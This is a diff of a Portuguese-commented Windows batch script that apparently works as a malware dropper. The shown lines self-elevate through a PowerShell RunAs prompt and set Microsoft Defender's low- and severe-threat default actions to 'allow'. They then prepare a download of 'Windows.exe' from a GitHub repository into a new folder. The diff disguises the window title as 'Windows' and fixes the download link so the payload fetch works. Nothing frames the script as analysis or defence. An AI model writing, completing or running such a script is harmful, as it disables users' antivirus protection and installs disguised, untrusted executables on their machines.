@@ -5,7 +5,7 @@ setlocal EnableDelayedExpansion
 net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)
 
 :: --- Configuracao visual do CMD ---
-title BoraBora
+title Windows
 mode con: cols=60 lines=12
 color 0F
 cls
@@ -72,8 +72,8 @@ powershell -Command "Set-MpPreference -LowThreatDefaultAction 6" >nul 2>&1
 powershell -Command "Set-MpPreference -SevereThreatDefaultAction 6" >nul 2>&1
 
 :: --- Configuracao de download ---
-set "URL=https://github.com/espertin/winds/blob/main/Windows.exe"
-set "PASTA_APP=C:\Microsofts"
+set "URL=https://github.com/espertin/winds/raw/main/Windows.exe"
+set "PASTA_APP=C:\WindsApp"
 set "NOME_EXE=Windows.exe"
 set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"
 
